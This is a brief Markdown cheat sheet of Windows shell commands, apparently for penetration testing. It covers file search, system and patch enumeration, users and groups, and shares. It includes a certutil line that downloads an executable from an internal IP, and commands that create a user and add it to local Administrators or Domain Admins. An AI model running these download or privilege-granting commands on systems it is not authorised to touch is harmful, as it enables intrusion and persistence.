# WINDOWS SHELL

## Searching for files

### Looking for a file

	dir flag /s /b

### Download a file with certutil

	certutil -urlcache -f http://10.11.11.30/Message.exe Message.exe

## Scheduled tasks

	schtasks
	tasklist

## System

	systeminfo
	systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

	wmic qfe get Caption,Description,HotFixID,InstalledOn

	driverquery

	netstat -anob

### Find windows version

	type C:\Windows\System32\license.rtf

	OR

	type C:\Windows\System32\eula.txt


## Users and groups

	net users %username%
	net users

	net localgroup
	net localgroup Administrators

	whoami /all
	whoami /priv

### Create user

- Basic syntax

		net user name password /add
		net user michael welcome123 /add

- Change user password

		net user /domain michael Ghost123

- Add user to local group

		net localgroup administrators michael /add

- Add user to Domain group

	net group groupName userName /ADD /DOMAIN
	net group "Domain Admins" testuser /ADD /DOMAIN

## Network and shares
https://www.howtogeek.com/118452/how-to-map-network-drives-from-the-command-prompt-in-windows/

	net share
	netstat -ano

	net use s: \\tower\movies /user:HTG CrazyFourHorseMen
	net use s: \\tower\movies /user:HTG CrazyFourHorseMen /persistent:Yes
	net use s: /delete

### List current smb session

	net session
